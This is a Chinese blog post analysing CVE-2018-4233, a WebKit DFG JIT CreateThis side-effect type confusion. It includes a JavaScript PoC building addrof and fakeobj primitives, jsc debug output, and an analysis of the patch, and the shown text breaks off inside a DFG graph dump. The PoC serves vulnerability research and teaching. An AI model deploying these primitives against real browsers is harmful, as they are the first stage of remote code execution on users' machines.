<!DOCTYPE html><html lang="zh-CN"><head><meta name="generator" content="Hexo 3.8.0"><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="author" content="dwfault"><title>CVE-2018-4233 WebKit DFG JIT CreateThis SideEffect type confusion · dwfault</title><meta name="description" content="一、简介CVE-2018-4233是Pwn2Own 2018上Samuel Groß团队用来攻破Safari浏览器的漏洞。这是一个JIT编译器中side effect导致IR建模失败而产生的一个类型混淆漏洞，通过这样的类型混淆漏洞可以得到addrof、fakeobj两个原语，从而直接获得沙箱内远程代"><meta name="keywords"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><link rel="short icon" href="/images/favicon.png" type="image/x-icon"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/blog_basic.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="/atom.xml"></head><body><div class="sidebar animated fadeInDown"><div class="logo-title"><div class="title"><img src="/images/logo@2x.png" style="width:127px;"><h3 title=""><a href="/">dwfault</a></h3></div></div><ul class="social-links"></ul><div class="footer"><a target="_blank" href="/"><span>Theme by </span></a><a href="https://www.caicai.me"> CaiCai </a><span>&</span><a href="https://github.com/Ben02/hexo-theme-Anatole"> Ben</a><div class="by_farbox"><a href="https://hexo.io/zh-cn/" target="_blank">Proudly published with Hexo&#65281;</a></div></div></div><div class="main"><div class="page-top animated fadeInDown"><div class="nav"><li><a href="/">首页</a></li><li><a href="/about">关于</a></li><li><a href="/archives">归档</a></li><li><a href="/links">友链</a></li></div><div class="information"><div class="back_btn"><li><a class="fa fa-chevron-left" onclick="window.history.go(-1)"> </a></li></div><div class="avatar"><img></div></div></div><div class="autopagerize_page_element"><div class="content"><div class="post-page"><div class="post animated fadeInDown"><div class="post-title"><h3><a>CVE-2018-4233 WebKit DFG JIT CreateThis SideEffect type confusion</a></h3></div><div class="post-content"><h3 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h3><p>CVE-2018-4233是Pwn2Own 2018上Samuel Groß团队用来攻破Safari浏览器的漏洞。这是一个JIT编译器中side effect导致IR建模失败而产生的一个类型混淆漏洞，通过这样的类型混淆漏洞可以得到addrof、fakeobj两个原语，从而直接获得沙箱内远程代码执行的效果。</p>
<p>CVE-2018-4233是JIT中的类型混淆漏洞中的一个经典，非常有代表性。</p>
<h3 id="二、漏洞概要"><a href="#二、漏洞概要" class="headerlink" title="二、漏洞概要"></a>二、漏洞概要</h3><p>该漏洞的fix位于<a href="https://github.com/WebKit/webkit/commit/b602e9d167b2c53ed96a42ed3ee611d237f5461a" target="_blank" rel="noopener">https://github.com/WebKit/webkit/commit/b602e9d167b2c53ed96a42ed3ee611d237f5461a</a>，本文基于其parent commit </p>
<p>7996e60。该版本更新时间是2018年3月末，PoC:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> someObject = &#123;&#125;;</span><br><span class="line"><span class="keyword">let</span> addrOfObject = primitiveAddrOf(someObject);</span><br><span class="line">print(addrOfObject);</span><br><span class="line"><span class="comment">//let craftedAddress = 3.54484805889626e-310;</span></span><br><span class="line"><span class="keyword">let</span> craftedAddress = addrOfObject;</span><br><span class="line"><span class="keyword">let</span> fakeObj = primitiveFakeObj(craftedAddress);</span><br><span class="line">print(fakeObj);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">primitiveAddrOf</span>(<span class="params">someObject</span>) </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">visit</span>(<span class="params">arr</span>) </span>&#123;</span><br><span class="line">         res = arr[<span class="number">0</span>];      </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> res = <span class="number">1.1</span>;</span><br><span class="line">    <span class="keyword">let</span> trigger = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">let</span> arr = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>];</span><br><span class="line">    <span class="keyword">let</span> handler = &#123;</span><br><span class="line">        get(target, propname) &#123;</span><br><span class="line">            <span class="keyword">if</span> (trigger)</span><br><span class="line">                arr[<span class="number">0</span>] = someObject;</span><br><span class="line">            <span class="keyword">return</span> target[propname];</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">let</span> visitProxy = <span class="keyword">new</span> <span class="built_in">Proxy</span>(visit, handler);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span>; i++)</span><br><span class="line">        <span class="keyword">new</span> visitProxy(arr, <span class="number">13.37</span>);</span><br><span class="line"></span><br><span class="line">    trigger = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">new</span> visitProxy(arr, <span class="number">13.37</span>);</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">primitiveFakeObj</span>(<span class="params">craftedAddress</span>) </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">assign</span>(<span class="params">arr, value</span>) </span>&#123;</span><br><span class="line">        arr[<span class="number">0</span>] = value;</span><br><span class="line">    &#125;</span><br><span class="line">   <span class="keyword">let</span> trigger = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">let</span> arr = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>];</span><br><span class="line">    <span class="keyword">let</span> handler = &#123;</span><br><span class="line">        get(target, propname) &#123;</span><br><span class="line">            <span class="keyword">if</span> (trigger) </span><br><span class="line">                arr[<span class="number">0</span>] = &#123;&#125;;</span><br><span class="line">            <span class="keyword">return</span> target[propname];</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">let</span> assignProxy = <span class="keyword">new</span> <span class="built_in">Proxy</span>(assign, handler);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span>; i++)</span><br><span class="line">        <span class="keyword">new</span> assignProxy(arr, <span class="number">13.37</span>);</span><br><span class="line">    trigger = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">new</span> assignProxy(arr, craftedAddress);</span><br><span class="line">    <span class="keyword">return</span> arr[<span class="number">0</span>]; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="三、基本概念"><a href="#三、基本概念" class="headerlink" title="三、基本概念"></a>三、基本概念</h3><p>JIT：即时编译，边运行边产生机器代码，常见于浏览器等脚本执行环境，使用机器码替换高级语言的代码来运行，代替解释器以优化运行速度。</p>
<p>DFG：dfg在编译原理中用来代表数据流图，在WebKit中是第一层优化编译器：</p>
<ul>
<li>LLInt -&gt; baseline JIT -&gt; DFG JIT -&gt; FTL JIT，函数、循环经过多次执行，从解释器到各优化编译器会进行tier up，是从左到右的过程。在这一过程中，JIT编译器会根据之前运行获得(profile)的<strong>类型信息</strong>对函数体中参数、变量的<strong>类型进行假定</strong>，生成代码执行(speculative execute)。</li>
<li>JIT编译器在执行遇到问题的时候会进行tier down，是从右到左的过程，在WebKit中被称为OSRExit，其实现包括<strong>Jump replacement</strong>等机制。</li>
</ul>
<p>side-effect：也被译为“副作用”，更新变量和数据结构的赋值语句。</p>
<p>IR建模：JIT优化编译器需要对中间表示(IR)的字节码进行建模，精确描述side effect等。在WebKit中有两处代码用于建模：<strong>DFGAbstractInterpreter</strong>、<strong>DFGClobberize</strong>，前者被简称为AI。</p>
<p>JSValue：JSValue是WebKit JavaScriptCore中用来表示和存储JS执行上下文中对象、整数、浮点数的而定义的一个类。其中重点关注：</p>
<ul>
<li>ArrayWithDouble，JS中的双精度浮点数数组，如果一个Array中只包含浮点数，它就是一个ArrayWithDouble类型的数组，<strong>其中的双精度浮点数按照IEEE754的原始浮点数存储</strong>。例如3.54484805889626e-310在内存中存储为0x0000414141414141。</li>
<li>ArrayWithContiguous，JS中的普通数组，如果一个Array中包含浮点数、对象等，它就是一个ArrayWithContiguous类型的数组，其中<strong>元素按照JSValue方式存储</strong>，其中对象指针用48位表示，前16位为0，而浮点数加上了0x0001000000000000。例如3.54484805889626e-310在内存中存储为0x0001414141414141。</li>
</ul>
<p>ArrayWithDouble、ArrayWithContiguous中浮点数和指针的互相赋值是构造类型混淆漏洞的方法。</p>
<p>在JIT类型混淆漏洞中，IR建模错误往往是漏洞产生的根本原因。一般过程是：</p>
<ul>
<li>通过IR建模错误，</li>
<li>利用side effect产生回调改变变量类型，</li>
<li>借助类型特化过的JIT代码，</li>
<li>赋值ArrayWithContiguous中的元素到ArrayWithDouble中，</li>
<li>得到类型混淆。</li>
</ul>
<h3 id="四、漏洞分析"><a href="#四、漏洞分析" class="headerlink" title="四、漏洞分析"></a>四、漏洞分析</h3><p>本部分以fakeobj这个原语为例解析这个漏洞，addof原语的构造与其极其相似，不需要调试稍作修改即可。</p>
<p><img src="CVE-2018-4233 WebKit DFG JIT CreateThis SideEffect type confusion.assets/image-20190102134532994-6407933.png" alt="image-20190102134532994"></p>
<p>设置调试目标为jsc，参数添加：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">--useConcurrentJIT=<span class="literal">false</span></span><br><span class="line">--dumpDisassembly=<span class="literal">true</span></span><br><span class="line">--dumpDFGDisassembly=<span class="literal">true</span></span><br><span class="line">--useFTLJIT=<span class="literal">false</span></span><br></pre></td></tr></table></figure>
<p>开始运行，从输出中可见，assign、get产生了DFG JIT代码：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Generated DFG JIT code <span class="keyword">for</span> assign<span class="comment">#EmOb1Y:[0x11cd78720-&gt;0x11cd78260-&gt;0x11cd98f20, DFGFunctionConstruct, 24], instruction count = 24:</span></span><br><span class="line">Optimized with execution counter = 150.000000/1133.000000, -850</span><br><span class="line">Code at [0x372925000780, 0x372925000dc0</span><br><span class="line">...</span><br><span class="line">Generated DFG JIT code <span class="keyword">for</span> get<span class="comment">#CsfvpT:[0x11cd78980-&gt;0x11cd784c0-&gt;0x11cd98fd0, DFGFunctionCall, 60], instruction count = 60:</span></span><br><span class="line">Optimized with execution counter = 420.000000/1306.000000, -580</span><br><span class="line">Code at [0x3729250002c0, 0x372925000780):</span><br></pre></td></tr></table></figure>
<h4 id="4-1-第一次OSRExit"><a href="#4-1-第一次OSRExit" class="headerlink" title="4.1 第一次OSRExit"></a>4.1 第一次OSRExit</h4><p>随后产生了Firing watchpoint，并丢弃get的dfg代码：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Firing watchpoint 0x11c86f398 on get<span class="comment">#CsfvpT:[0x11cd78980-&gt;0x11cd784c0-&gt;0x11cd98fd0, DFGFunctionCall, 60]</span></span><br><span class="line">Jettisoning get<span class="comment">#CsfvpT:[0x11cd78980-&gt;0x11cd784c0-&gt;0x11cd98fd0, DFGFunctionCall, 60] and counting reoptimization due to UnprofiledWatchpoint, Executed op_put_scope&lt;LocalClosureVar&gt;.</span></span><br></pre></td></tr></table></figure>
<p>栈回溯可见，它的产生是由于JIT::operationPutToScope，显然这个栈回溯来自代理中get handler中的赋值<code>arr[0] = {};</code>。</p>
<p><img src="CVE-2018-4233 WebKit DFG JIT CreateThis SideEffect type confusion.assets/image-20190102135609869-6408569.png" alt="image-20190102135609869"></p>
<p>之后是相应的JumpReplacement：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Firing jump replacement watchpoint from 0x3729250003ee, to 0x37252900067f.</span><br><span class="line">    Did invalidate get<span class="comment">#CsfvpT:[0x11cd78980-&gt;0x11cd784c0-&gt;0x11cd98fd0, DFGFunctionCall, 60]</span></span><br><span class="line">    Did count reoptimization <span class="keyword">for</span> get<span class="comment">#CsfvpT:[0x11cd78980-&gt;0x11cd784c0-&gt;0x11cd98fd0, DFGFunctionCall, 60]</span></span><br><span class="line">    Did install baseline version of get<span class="comment">#CsfvpT:[0x11cd78980-&gt;0x11cd784c0-&gt;0x11cd98fd0, DFGFunctionCall, 60]</span></span><br><span class="line">Generated JIT code <span class="keyword">for</span> Baseline put_by_val stub <span class="keyword">for</span> get<span class="comment">#CsfvpT:[0x11cd784c0-&gt;0x11cd98fd0, BaselineFunctionCall, 60 (FTLFail)], return point 0x3728e500268c:</span></span><br><span class="line">    Code at [0x372925000240, 0x3729250002c0):</span><br></pre></td></tr></table></figure>
<p><img src="CVE-2018-4233 WebKit DFG JIT CreateThis SideEffect type confusion.assets/image-20190102140009081-6408809.png" alt="image-20190102140009081"></p>
<p>Jump replacement位于DFG JIT code for get，大概位置是：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">SetArgument</span><br><span class="line">SetArgument</span><br><span class="line">CheckStructure</span><br><span class="line">SetArgument</span><br><span class="line">MovHint</span><br><span class="line">JSConstant</span><br><span class="line">...</span><br><span class="line">InvalidationPoint</span><br><span class="line">[GetLocal]       		    -&gt; jump from here</span><br><span class="line">CheckStringIdent</span><br><span class="line">GetButterfly</span><br><span class="line">GetByOffset</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h4 id="4-2-第二次OSRExit"><a href="#4-2-第二次OSRExit" class="headerlink" title="4.2 第二次OSRExit"></a>4.2 第二次OSRExit</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Firing watchpoint 0x11c86f438 on get<span class="comment">#CsfvpT:[0x11cd78980-&gt;0x11cd784c0-&gt;0x11cd98fd0, DFGFunctionCall, 60]</span></span><br><span class="line">Jettisoning get<span class="comment">#CsfvpT:[0x11cd78980-&gt;0x11cd784c0-&gt;0x11cd98fd0, DFGFunctionCall, 60] and counting reoptimization due to UnprofiledWatchpoint, Structure transition from 0x11cdf2760:[Array, &#123;&#125;, ArrayWithDouble, Proto:0x11cdb4090, Shady leaf].</span></span><br></pre></td></tr></table></figure>
<p>此次的栈回溯为：</p>
<p><img src="CVE-2018-4233 WebKit DFG JIT CreateThis SideEffect type confusion.assets/image-20190102140537841-6409137.png" alt="image-20190102140537841"></p>
<p>其中的重点是：</p>
<p>JSC::JSObject::convertDooubleToContiguousWhilePerformingSetIndex<br>JIT::operationPutByVal<br><strong>0x3728e500268c baseline JIT code for get# [put_by_val]</strong><br>JSC::ProxyObject::getOwnPropertySlot<br>JSC::JSObject::get 回调发生处<br><strong>dfg::operationCreateThis(0x100d53cd0)</strong><br><strong>0x372925000c05 DFG JIT code for assign#</strong><br>JIT::operationLinkCall<br><strong>0x3728e50038d3 Baseline JIT code for primitiveFakeObj# [construct]</strong></p>
<p>随后有：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Firing watchpoint 0x11c86f208 on assign<span class="comment">#EmOb1Y:[0x11cd78720-&gt;0x11cd78260-&gt;0x11cd98f20, DFGFunctionConstruct, 24]</span></span><br><span class="line">Jettisoning assign<span class="comment">#EmOb1Y:[0x11cd78720-&gt;0x11cd78260-&gt;0x11cd98f20, DFGFunctionConstruct, 24] and counting reoptimization due to UnprofiledWatchpoint, Structure transition from 0x11cdf2760:[Array, &#123;&#125;, ArrayWithDouble, Proto:0x11cdb4090, Shady leaf].</span></span><br><span class="line"></span><br><span class="line">Firing jump replacement watchpoint from 0x3729250008dc, to 0x372925000d45.</span><br><span class="line">    Did invalidate assign<span class="comment">#EmOb1Y:[0x11cd78720-&gt;0x11cd78260-&gt;0x11cd98f20, DFGFunctionConstruct, 24]</span></span><br><span class="line">    Did count reoptimization <span class="keyword">for</span> assign<span class="comment">#EmOb1Y:[0x11cd78720-&gt;0x11cd78260-&gt;0x11cd98f20, DFGFunctionConstruct, 24]</span></span><br><span class="line">    Did install baseline version of assign<span class="comment">#EmOb1Y:[0x11cd78720-&gt;0x11cd78260-&gt;0x11cd98f20, DFGFunctionConstruct, 24]</span></span><br></pre></td></tr></table></figure>
<p>DFG jump 位于DFG JIT for assign：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">CheckTraps</span><br><span class="line">InvalidationPoint</span><br><span class="line">[GetLocal]           -&gt; jump from here</span><br><span class="line">CreateThis</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>从打印数据里看CreateThis的执行调用operationCreateThis，然后从JSC::JSObject::get中回调触发assign赋值(ConvertDoubleToContiguous)，然后触发Jump replacement，但显然Jump replacement的跳出点位于CreateThis之前，而CreateThis之后不再有跳出点。意即：虽然作出了OSRExit的动作，但并没有成功OSRExit，这里就是bug的直观表现了。</p>
<h3 id="五、补丁分析"><a href="#五、补丁分析" class="headerlink" title="五、补丁分析"></a>五、补丁分析</h3><p>针对这个漏洞，补丁围绕对CreateThis字节码进行建模修改了两处内容clobberize、AbstractInterpreter。下面分别考察这两部分的作用。在这个过程中，可以多次修改代码、编译运行程序、dump内存、放入反汇编器，便于阅读JIT代码提高效率。</p>
<p>用于dump内存的lldb命令为：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">me <span class="built_in">read</span> -o /Users/dwfault/Downloads/dump.bin -b 0x31fe33000500 0x31fe33001000 --force</span><br></pre></td></tr></table></figure>
<h4 id="5-1-考察clobberize"><a href="#5-1-考察clobberize" class="headerlink" title="5.1 考察clobberize"></a>5.1 考察clobberize</h4><p><img src="CVE-2018-4233 WebKit DFG JIT CreateThis SideEffect type confusion.assets/image-20190102143448324-6410888.png" alt="image-20190102143448324"></p>
<p><img src="CVE-2018-4233 WebKit DFG JIT CreateThis SideEffect type confusion.assets/image-20190102143946262-6411186.png" alt="image-20190102143946262"></p>
<p>右图的字节码对应write(Heap)补丁之后的代码。可以看到IR中的CreateThis后面增加了一个InvalidationPoint，其他都没有改变。但由于此处相应会产生一个Jump replacement(参考DFGInvalidationPointInjectionPhase)，导致CreateThis回调结束之后会被Jump replacement引到OSRExit，使漏洞不再触发。</p>
<h4 id="5-2-考察AbstractInterperter"><a href="#5-2-考察AbstractInterperter" class="headerlink" title="5.2 考察AbstractInterperter"></a>5.2 考察AbstractInterperter</h4><p>按照同样的方法，现在为CreateThis只加上clobberWorld。</p>
<p><img src="CVE-2018-4233 WebKit DFG JIT CreateThis SideEffect type confusion.assets/image-20190102144836735-6411716.png" alt="image-20190102144836735"></p>
<p><img src="CVE-2018-4233 WebKit DFG JIT CreateThis SideEffect type confusion.assets/image-20190102144930667-6411770.png" alt="image-20190102144930667"></p>
<p>可以看到在GetButterfly之前增加了一个CheckStrucure，其x86机器码是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmp dword [rax], 0x5b</span><br></pre></td></tr></table></figure>
<p>细致调试可以知道，arr变量的structureID之前是0x5b，现在成了0x5c，这也使得执行流程走向了OSRExit，使漏洞不再发生。</p>
<h4 id="5-3-深究clobberize与AbstractInterpreter"><a href="#5-3-深究clobberize与AbstractInterpreter" class="headerlink" title="5.3 深究clobberize与AbstractInterpreter"></a>5.3 深究clobberize与AbstractInterpreter</h4><p>可以看到在5.1、5.2两节中，clobberize、AbstractInterpretrer两处对IR建模的描述直接导致了JIT编译器产生了不同的代码。其中5.1节clobber与InvalidationPoint的关系非常明确，在DFGInvalidationPointInjectPhase中可以很明确地知道：</p>
<p>(1) DFGClobberize把Abstract Heap以树型结构分为几类：</p>
<ul>
<li>World<ul>
<li>Stack</li>
<li>Heap<ul>
<li>Other(Top)<ul>
<li>Other(none Top)</li>
<li>Watchpoint_fire<ul>
<li>SideState</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>(2) writesOverlap函数检查目标opcode结点的write属性与WatchPoint_fire在树型结构中的父子关系，如果WatchPoint_fire在目标opcode结点的子树上，则插入InvalidationPoint。</p>
<p>而对于AbstractInterpreter，clobberWorld的作用不明显，需要加以更多调试。 回到漏洞版本，增加运行选项运行：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--dumpDFGGraphAtEachPhase=<span class="literal">true</span></span><br></pre></td></tr></table></figure>
<p>得到的输出节选如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><span class="line">Beginning DFG phase structure check hoisting.</span><br><span class="line">Before structure check hoisting:</span><br><span class="line"></span><br><span class="line">DFG <span class="keyword">for</span> assign<span class="comment">#Ei5h05:[0x11cd78720-&gt;0x11cd78260-&gt;0x11cd98f20, DFGFunctionConstruct, 24]:</span></span><br><span class="line">Fixpoint state: BeforeFixpoint; Form: ThreadedCPS; Unification state: GloballyUnified; Ref count state: EverythingIsLive</span><br><span class="line">Arguments <span class="keyword">for</span> block<span class="comment">#0: @0, @1, @2</span></span><br><span class="line">Block <span class="comment">#0 (bc#0): (OSR target)</span></span><br><span class="line">Execution count: 1.000000</span><br><span class="line">Predecessors:</span><br><span class="line">Successors:</span><br><span class="line">Dominated by: <span class="comment">#root #0</span></span><br><span class="line">Dominates: <span class="comment">#0</span></span><br><span class="line">Dominance Frontier:</span><br><span class="line">Iterated Dominance Frontier:</span><br><span class="line">States: StructuresAreWatched, CurrentlyCFAUnreachable</span><br><span class="line">Vars Before: &lt;empty&gt;</span><br><span class="line">Intersected Vars Before: arg2:(DoubleImpureNan|Top|Empty, TOP, TOP) arg1:(DoubleImpureNan|Top|Empty, TOP, TOP) arg0:(DoubleImpureNan|Top|Empty, TOP, TOP) loc0:(DoubleImpureNan|Top|Empty, TOP, TOP) loc1:(DoubleImpureNan|Top|Empty, TOP, TOP) loc2:(DoubleImpureNan|Top|Empty, TOP, TOP) loc3:(DoubleImpureNan|Top|Empty, TOP, TOP) loc4:(DoubleImpureNan|Top|Empty, TOP, TOP) loc5:(DoubleImpureNan|Top|Empty, TOP, TOP) loc6:(DoubleImpureNan|Top|Empty, TOP, TOP) loc7:(DoubleImpureNan|Top|Empty, TOP, TOP)</span><br><span class="line">Var Links: arg2:@2 arg1:@1 arg0:@0</span><br><span class="line">0:&lt; 1:-&gt; SetArgument(this(a), W:SideState, bc<span class="comment">#0, ExitValid) predicting ProxyObject</span></span><br><span class="line">1:&lt; 1:-&gt; SetArgument(IsFlushed, arg1(B&lt;Array&gt;/FlushedCell), W:SideState, bc<span class="comment">#0, ExitValid) predicting Array</span></span><br><span class="line">2:&lt; 1:-&gt; SetArgument(IsFlushed, arg2(C~&lt;Double&gt;/FlushedJSValue), W:SideState, bc<span class="comment">#0, ExitValid) predicting NonIntAsdouble</span></span><br><span class="line">3:&lt; 1:-&gt; JSConstant(JS|PureInt, Other, Undefined, bc<span class="comment">#0, ExitValid)</span></span><br><span class="line">4:&lt;!0:-&gt; MovHint(Check:Untyped:@3, MustGen, loc0, W:SideState, ClobbersExit, bc<span class="comment">#0, ExitValid)</span></span><br><span class="line">5:&lt; 1:-&gt; SetLocal(Check:Untyped:@3, loc0(D~&lt;Other&gt;/FlushedJSValue), W:Stack(-1), bc<span class="comment">#0, ExitInvalid) predicting Other</span></span><br><span class="line">6:&lt;!0:-&gt; MovHint(Check:Untyped:@3, MustGen, loc1, W:SideState, ClobbersExit, bc<span class="comment">#0, ExitInvalid)</span></span><br><span class="line">7:&lt; 1:-&gt; SetLocal(Check:Untyped:@3, loc1(E~&lt;Other&gt;/FlushedJSValue), W:Stack(-2), bc<span class="comment">#0, ExitInvalid) predicting Other</span></span><br><span class="line">8:&lt;!0:-&gt; MovHint(Check:Untyped:@3, MustGen, loc2, W:SideState, ClobbersExit, bc<span class="comment">#0, ExitInvalid)</span></span><br><span class="line">9:&lt; 1:-&gt; SetLocal(Check:Untyped:@3, loc2(F~&lt;Other&gt;/FlushedJSValue), 